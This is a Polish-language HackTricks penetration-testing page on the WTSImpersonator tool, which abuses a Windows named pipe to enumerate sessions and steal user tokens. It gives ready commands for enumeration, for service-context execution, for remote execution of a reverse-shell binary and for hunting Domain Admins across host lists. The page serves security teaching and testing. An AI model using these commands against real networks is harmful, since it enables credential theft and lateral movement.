# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

Narzędzie **WTS Impersonator** wykorzystuje potok nazwany RPC **"\\pipe\LSM_API_service"**, aby w sposób ukryty enumerować zalogowanych użytkowników i przejmować ich tokeny, omijając tradycyjne techniki **Token Impersonation**. Takie podejście ułatwia płynne przeprowadzanie lateral movements w sieciach. Autorstwo tej innowacyjnej techniki przypisuje się **Omri Baso**, którego praca jest dostępna na [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.**<sup>[[1]](#references)</sup>

### Główne funkcje

Narzędzie działa poprzez sekwencję wywołań API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Kluczowe moduły i użycie

- **Enumerowanie użytkowników**: Za pomocą narzędzia możliwe jest lokalne i zdalne enumerowanie użytkowników, przy użyciu poleceń dla obu scenariuszy:

- Lokalnie:
```bash
.\WTSImpersonator.exe -m enum
```
- Zdalnie, poprzez określenie adresu IP lub nazwy hosta:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Wykonywanie poleceń**: Moduły `exec` i `exec-remote` wymagają do działania kontekstu **Service**. Lokalne wykonanie wymaga jedynie pliku wykonywalnego WTSImpersonator oraz polecenia:

- Przykład lokalnego wykonywania polecenia:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe może zostać użyty do uzyskania kontekstu Service:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Zdalne wykonywanie poleceń**: Obejmuje zdalne utworzenie i zainstalowanie usługi, podobnie jak w przypadku PsExec.exe, co umożliwia wykonywanie poleceń z odpowiednimi uprawnieniami.

- Przykład zdalnego wykonywania:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Moduł User Hunting**: Wyszukuje określonych użytkowników na wielu komputerach, wykonując kod przy użyciu ich poświadczeń. Jest to szczególnie przydatne podczas atakowania Domain Admins posiadających lokalne uprawnienia administratora w kilku systemach.
- Przykład użycia:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Odnośniki

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
